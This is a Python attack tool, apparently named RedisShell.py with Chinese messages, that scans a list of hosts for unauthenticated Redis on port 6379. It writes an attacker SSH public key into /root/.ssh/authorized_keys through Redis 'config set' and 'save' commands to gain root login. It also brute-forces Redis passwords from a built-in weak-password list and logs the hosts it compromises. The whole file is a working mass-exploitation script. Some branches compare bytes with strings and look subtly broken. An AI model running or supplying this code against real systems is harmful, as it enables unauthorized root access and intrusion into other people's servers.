import getopt
import math
import socket
import sys
import threading
from colorama import Fore, Style, init

init(autoreset=True)

PASSWORD_DIC=['redis','root','oracle','password','p@aaw0rd','abc123!','123456','admin','admin123','12345','qwer1234']

id_rsa ="""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXbR3exPixxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxCKjakqHgqB2uhjf0/I1iPuD14CkY1qIfHOBKGfBu4owq/SpmnpDJBKqff1tQbVpCMZsxFTbHE7XCeL5AkJ28= root@kali"""

def logo():
    banner = Fore.YELLOW + """

                                              _       _     
      __ _ _ __   __ _ _   _  __ _ _ __   ___| |_   _| |__  
     / _` | '_ \ / _` | | | |/ _` | '_ \ / __| | | | | '_ \ 
    | (_| | | | | (_| | |_| | (_| | | | | (__| | |_| | |_) |
     \__,_|_| |_|\__, |\__,_|\__,_|_| |_|\___|_|\__,_|_.__/ 
                    |_|                                     

    Python3 By MuHan
    Usage:python3 RedisShell.py -t threads -u urls.txt
    一键批量写入公钥，因为nc反弹shell不支持多个，这里就不写多线程利用了
    """ + Style.RESET_ALL
    print(banner)

def start():
    if len(sys.argv) == 5:
        print(Fore.GREEN + "小伙子不要捉急，程序已经开始跑了~" + Style.RESET_ALL)
        opts,args = getopt.getopt(sys.argv[1:], "t:u:")

        for k,v in opts:
            if k == "-t":
                threads = int(v)
            elif k == "-u":
                dic = v
        scan(threads, dic,id_rsa)
    else:
        print(Fore.WHITE + "python3 poc.py -t threads -u urls.txt" + Style.RESET_ALL)

def scan(threads, dic,id_rsa):
    result_list = []
    threads_list = []
    with open(dic, "r") as f:
        dic_list = f.readlines()

    if len(dic_list) % threads == 0:
        threads_read_line_num = len(dic_list) // threads
    else:
        threads_read_line_num = math.ceil(len(dic_list) / threads)

    i = 0
    temp_list = []
    for line in dic_list:
        i = i + 1
        if i % threads_read_line_num == 0:
            temp_list.append(line.strip())
            result_list.append(temp_list)
            temp_list = []
        else:
            temp_list.append(line.strip())

    for urls in result_list:
        threads_list.append(threading.Thread(target=ask, args=(urls,id_rsa,)))
    for t in threads_list:
        t.start()

def ask(urls,id_rsa):
    for ip in urls:
        ip = ip.strip()
        print(ip)
        try:
            check(ip, 6379, id_rsa , timeout=5)
        except Exception as e:
            print(e)
            pass

def check(ip,port,id_rsa,timeout):
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip,int(port)))
        s.send(b"INFO\r\n")
        result = s.recv(1024).decode(encoding="utf-8")
        if "redis_version" in result:
            print(Fore.WHITE + "%s:%s未授权访问"%(ip,port) + Style.RESET_ALL)    

            with open('未授权访问.txt','a+',encoding='utf-8') as f:
                    f.write("%s:%s未授权访问"%(ip,port)+"\n")


            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, int(port)))
            s.send(b"config set dir /root/.ssh/\n")
            content1 = s.recv(1024).decode(encoding="utf-8")
            print(content1)

            if "OK" in content1:
                print (Fore.BLUE + "%s:%s .ssh目录存在且权限足够"%(ip,port) + Style.RESET_ALL)

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, int(port)))
                s.send(b"config set dbfilename authorized_keys\n")
                content2 = s.recv(1024).decode(encoding="utf-8")
                print(content2)
                if "OK" in content2:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ip, int(port)))
                    payload = r'"\n\n\n\{}\n\n\n"'.format(id_rsa)
                    print(payload)
                    s.send(bytes('set payload {}\n'.format(payload), encoding="UTF-8"))

                    content3 = s.recv(1024).decode(encoding="utf-8")
                    print(content3)
                    if "OK" in content3:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip, int(port)))
                        s.send(b"save\n")
                        content4 = s.recv(1024).decode(encoding="utf-8")
                        print(content4)
                        if "OK" in content4:
                            print (Fore.GREEN + "%s:%s 公钥写入完成，请自行测试：ssh -i id_rsa root@%s"%(ip,port,ip) + Style.RESET_ALL)

                            with open("ssh公钥写入成功的地址.txt","a+",encoding="utf-8") as f:
                                f.write("%s:%s 公钥写入完成，请自行测试：ssh -i id_rsa root@%s"%(ip,port,ip) + "\n")


            elif b"error" in content1:
                print (Fore.RED + "%s:%s 无法写入"%(ip,port) + Style.RESET_ALL)
            elif b"Authentication" in result:
                for pass_ in PASSWORD_DIC:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ip, int(port)))
                    s.send(("AUTH %s\r\n" %(pass_)).encode())
                    result = s.recv(1024).decode(encoding="utf-8")
                    if b'+OK' in result:
                        print (Fore.GREEN + "%s:%s存在弱口令，密码：%s" % (ip,port,pass_) + Style.RESET_ALL)
                        
                        with open('ip_ok.txt','a+',encoding='utf-8') as f:
                                f.write("%s:%s存在弱口令，密码：%s" % (ip,port,pass_) + "\n")

    except Exception as e:
        print(e)


if __name__ == "__main__":
    logo()
    start()
